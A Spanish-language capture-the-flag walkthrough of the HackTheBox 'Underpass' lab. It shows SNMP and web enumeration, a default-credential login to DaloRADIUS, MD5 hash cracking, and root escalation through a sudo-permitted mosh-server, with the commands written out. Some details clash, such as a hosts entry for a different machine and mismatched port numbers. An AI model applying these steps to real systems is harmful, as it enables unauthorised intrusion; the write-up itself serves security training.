# Underpass

![](../../../../~gitbook/image.md)Publicado: 08 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Easy
###📝 Descripción
Underpass es una máquina Linux de dificultad Easy de HackTheBox que presenta un escenario realista de administración de servicios RADIUS. La explotación se centra en el descubrimiento de información sensible a través de SNMP, seguido de la enumeración de un panel web de DaloRADIUS mal configurado que expone credenciales de usuarios.
####🎯 Objetivos de Aprendizaje
- Enumeración SNMP: Técnicas de reconocimiento usando protocolos de gestión de red
- Explotación Web: Análisis de aplicaciones RADIUS y paneles administrativos
- Cracking de Hashes: Recuperación de credenciales mediante ataques de diccionario
- Escalada de Privilegios: Abuso de binarios con permisos sudo para ganar acceso root

####🔧 Tecnologías Involucradas
- SNMP v1/v2c: Protocolo de gestión de red para descobrimiento de información
- DaloRADIUS 2.2 beta: Panel web de administración RADIUS
- Apache 2.4.52: Servidor web con aplicaciones PHP
- Mosh (Mobile Shell): Herramienta de shell remoto con vulnerabilidad de escalada

####📊 Categorías de Vulnerabilidades
- Information Disclosure via SNMP
- Weak Authentication en paneles administrativos
- Password Hash Exposure en bases de datos
- Sudo Misconfiguration para escalada de privilegios

###🔭 Reconocimiento

####Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 64 sugiere que probablemente sea una máquina Linux.
####Escaneo de puertos TCP

####Enumeración de servicios

####Escaneo de puertos UDP

####🐍 Análisis del puerto 161 UDP SNMP
Usamos la herramienta snmpbrute para intentar descubrir recursos en red con nombres comunidades públicas que puedan estar expuestas en este servicio![](../../../../~gitbook/image.md)Usamos la herramienta snmp-check para extraer strings de las comunidades enumeradas anteriormente para ver si descubrimos algún recurso interensante:![](../../../../~gitbook/image.md)No descubrimos nada más alla del nombre de vhost que añadiremos a nuestro fichero /etc/hosts, la versión del kernel de linux del host y un usuario llamado steve⚠️ Debemos añadir el siguiente vhost a nuestro fichero /etc/hosts
###🌐 Enumeración Web

####🏠 Puerto 80 HTTP (underpass.htb)
No encontramos gran cosa al enumerar el sitio de forma manual salvo la típica web de apache en construcción.![](../../../../~gitbook/image.md)
####📂 Fuzzing de directorios
Tras probar a realizar fuzzing de directorios con ferxobuster y la lista `/usr/share/seclists/Discovery/Web-Content/common.txt` encontramos algunos recursos interesantes:![](../../../../~gitbook/image.md)📝 ChangeLog de DaloRADIUShttp://10.10.11.48/daloradius/ChangeLog![](../../../../~gitbook/image.md)🙈 Archivo .gitignorehttp://10.10.11.48/daloradius/.gitignoreUsando la herramienta dirsearch para realizar fuzzing sobre 10.10.11.48/daloradius añadimos algunos nuevos resultados a nuestro scope:![](../../../../~gitbook/image.md)🐳 Descubrimiento del Docker Composehttp://10.10.11.48/daloradius/docker-compose.ymlhttp://10.10.11.48/daloradius/app/users/login.php![](../../../../~gitbook/image.md)Buscamos credenciales por defecto para este servicio y encontramos algunas como:Pero ninguna parece funcionar.El directorio /app parece ser bastante relevante por lo que realizamos nuevamente fuzzing sobre el mismo usando en esta ocasión la lista `usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt `y encontramos algunos recursos adicionales para añadir a nuestro scope:![](../../../../~gitbook/image.md)
####🔓 Explotación - Panel DaloRADIUS
http://10.10.11.48/daloradius/app/operators/login.php
Aquí encontramos otro panel que parece estar destinado a los administradores. Además vemos una versión del servicio (2.2 beta)![](../../../../~gitbook/image.md)Probamos de nuevo con las credenciales por defecto:Logramos entrar con la cuenta `administrator:radius`![](../../../../~gitbook/image.md)💎 Extracción de credencialesEnumeramos información dentro del servicio para ver si encontramos algo interesante. A los pocos minutos encontramos una opción que nos permite listar información de los usuarios y encontramos un hash de un usuario llamado svcMosh:![](../../../../~gitbook/image.md)🔨 Cracking del hash MD5Vemos que se trata de un hash en MD5 y lo crackeamos usando hashcat y el diccionario rockyou:![](../../../../~gitbook/image.md)
####🔑 Acceso inicial
Y obtenemos la contraseña: underwaterfriends. Ahora que tenemos una credencial, podemos intentar usarla con el servicio SSH para ver si es válida. Una pequeña prueba con netexec nos revela que la credencial es válida con este servicio:![](../../../../~gitbook/image.md)Obtenemos la primera flag en el directorio del usuario svcMosh:
###### 🚀 Escalada de privilegios
🔍 Enumeración de permisos sudoComprobamos que el usuario svcmosh puede ejecutar el siguiente como root:
####⚡ Explotación del binario mosh-server
Mosh (Mobile Shell) es una herramienta utilizada para conexiones remotas que mantiene sesiones activas incluso cuando hay interrupciones en la red. El binario `mosh-server` inicia un servidor de Mosh y puede aceptar parámetros que podrían ser explotados.En este caso, usaremos la posibilidad de ejecutarlo como `sudo` para ganar acceso privilegiado.Abusar de `mosh-server` para escalada de privilegios- `sudo`: Ejecuta el comando con privilegios de superusuario.
- `/usr/bin/mosh-server`: El binario que tiene permisos `NOPASSWD` según el resultado de `sudo -l`. Esto permite ejecutarlo sin contraseña.
- `new`: Le dice a `mosh-server` que inicie una nueva sesión.
- `-- /bin/bash`: Especifica que se quiere abrir un intérprete de comandos (shell) `/bin/bash`.
- Este comando inicia una nueva instancia de `mosh-server`, que en este caso ejecuta un shell interactivo (`/bin/bash`) como superusuario (`root`) debido a los permisos de `sudo` asignados al binario.
![](../../../../~gitbook/image.md)El servidor genera una clave (`MOSH_KEY`) y asigna un puerto para la sesión de conexión 60002.Conexión al servidor con `mosh-client`:Aplicamos en el comando la key, la ip local host y el puerto:Explicación:- `MOSH_KEY=...`: Exporta la clave de conexión generada por el servidor para que el cliente pueda autenticar la sesión.
- `mosh-client`: Cliente de Mosh que se conecta al servidor.
- `127.0.0.1`: Es la dirección del localhost, ya que el servidor y cliente están en la misma máquina.
- `60002`: Es el puerto asignado al servidor `mosh-server`.
Resultado: Este comando establece una conexión entre el cliente y el servidor de Mosh, iniciando una sesión interactiva con permisos de `root`.![](../../../../~gitbook/image.md)Last updated 10 months ago- [📝 Descripción](#descripcion)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración Web](#enumeracion-web)

```
❯ ping -c2 10.10.11.48
PING 10.10.11.48 (10.10.11.48) 56(84) bytes of data.
64 bytes from 10.10.11.48: icmp_seq=1 ttl=63 time=43.7 ms
64 bytes from 10.10.11.48: icmp_seq=2 ttl=63 time=43.8 ms

--- 10.10.11.48 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 43.734/43.762/43.791/0.028 ms

```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.48 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
❯ echo $ports
22,80
```

```
❯ nmap -sC -sV -p$ports 10.10.11.48 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 11:56 CEST
Nmap scan report for 10.10.11.48
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```
nmap -sU  -F 10.10.11.48
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-08 12:16 CEST
Nmap scan report for 10.10.11.48
Host is up (0.044s latency).
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
```

```
snmpbrute -t 10.10.11.48
```

```
snmp-check -c public -v1 10.10.11.48
```

```
echo "10.10.11.47 linkvortex.htb" | sudo tee -a /etc/hosts
```

```
feroxbuster -u http://10.10.11.48 -r  -w /usr/share/seclists/Discovery/Web-Content/common.txt  --scan-dir-listings -C 503 -x php,xml
```

```
.idea/
*.log
*.db
invoice_preview.html
.DS_Store
data/
internal_data/

var/log/*.log
var/backup/*.sql
app/common/includes/daloradius.conf.php
app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/*
```

```
dirsearch -u 10.10.11.48/daloradius -x 503
```

```
version: "3"

services:

radius-mysql:
image: mariadb:10
container_name: radius-mysql
restart: unless-stopped
environment:
- MYSQL_DATABASE=radius
- MYSQL_USER=radius
- MYSQL_PASSWORD=radiusdbpw
- MYSQL_ROOT_PASSWORD=radiusrootdbpw
volumes:
- "./data/mysql:/var/lib/mysql"

radius:
container_name: radius
build:
context: .
dockerfile: Dockerfile-freeradius
restart: unless-stopped
depends_on:
- radius-mysql
ports:
- '1812:1812/udp'
- '1813:1813/udp'
environment:
- MYSQL_HOST=radius-mysql
- MYSQL_PORT=3306
- MYSQL_DATABASE=radius
- MYSQL_USER=radius
- MYSQL_PASSWORD=radiusdbpw
# Optional settings
- DEFAULT_CLIENT_SECRET=testing123
volumes:
- ./data/freeradius:/data
# If you want to disable debug output, remove the command parameter
command: -X

radius-web:
build: .
container_name: radius-web
restart: unless-stopped
depends_on:
- radius
- radius-mysql
ports:
- '80:80'
- '8000:8000'
environment:
- MYSQL_HOST=radius-mysql
- MYSQL_PORT=3306
- MYSQL_DATABASE=radius
- MYSQL_USER=radius
- MYSQL_PASSWORD=radiusdbpw
# Optional Settings:
- DEFAULT_CLIENT_SECRET=testing123
- DEFAULT_FREERADIUS_SERVER=radius
- MAIL_SMTPADDR=127.0.0.1
- MAIL_PORT=25
- MAIL_FROM=root@daloradius.xdsl.by
- MAIL_AUTH=

volumes:
- ./data/daloradius:/data
```

```
Usuario: administrator Contraseña: password
Usuario: administrator Contraseña: radius
Usuario: admin Contraseña: admin
```

```
Usuario: administrator Contraseña: password
Usuario: administrator Contraseña: radius
Usuario: admin Contraseña: admin
```

```
nth --text '412DD4759978ACFCC81DEAB01B382403'
```

```
hashcat -a 0 -m 0 '412DD4759978ACFCC81DEAB01B382403'  /usr/share/wordlists/rockyou.txt
```

```
netexec ssh 10.10.11.48 -u 'svcMosh' -p 'underwaterfriends'
```

```
0.10.11.48's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

* Documentation:  https://help.ubuntu.com
* Management:     https://landscape.canonical.com
* Support:        https://ubuntu.com/pro

System information as of Sun Jun  8 10:58:23 AM UTC 2025

System load:  0.0               Processes:             226
Usage of /:   52.4% of 6.56GB   Users logged in:       0
Memory usage: 16%               IPv4 address for eth0: 10.10.11.48
Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$
```

```
svcMosh@underpass:~$ cd /home                                                                     svcMosh@underpass:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Dec 11 16:06 .
drwxr-xr-x 18 root    root    4096 Dec 11 16:06 ..
drwxr-x---  5 svcMosh svcMosh 4096 Jan 11 13:29 svcMosh
svcMosh@underpass:/home$ cd svcMosh/
svcMosh@underpass:~$ ls -la
total 36
drwxr-x--- 5 svcMosh svcMosh 4096 Jan 11 13:29 .
drwxr-xr-x 3 root    root    4096 Dec 11 16:06 ..
lrwxrwxrwx 1 root    root       9 Sep 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 svcMosh svcMosh  220 Sep  7  2024 .bash_logout
-rw-r--r-- 1 svcMosh svcMosh 3771 Sep  7  2024 .bashrc
drwx------ 2 svcMosh svcMosh 4096 Dec 11 16:06 .cache
drwxrwxr-x 3 svcMosh svcMosh 4096 Jan 11 13:29 .local
-rw-r--r-- 1 svcMosh svcMosh  807 Sep  7  2024 .profile
drwxr-xr-x 2 svcMosh svcMosh 4096 Dec 11 16:06 .ssh
-rw-r----- 1 root    svcMosh   33 Jun  8 09:55 user.txt
svcMosh@underpass:~$ cat user.txt
```

```
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
use_pty

User svcMosh may run the following commands on localhost:
(ALL) NOPASSWD: /usr/bin/mosh-server
```

```
sudo /usr/bin/mosh-server new -- /bin/bash
```

```
MOSH_KEY=qLZ1TE5mTvvQiy/QKfRrZw mosh-client 127.0.0.1 60001
```
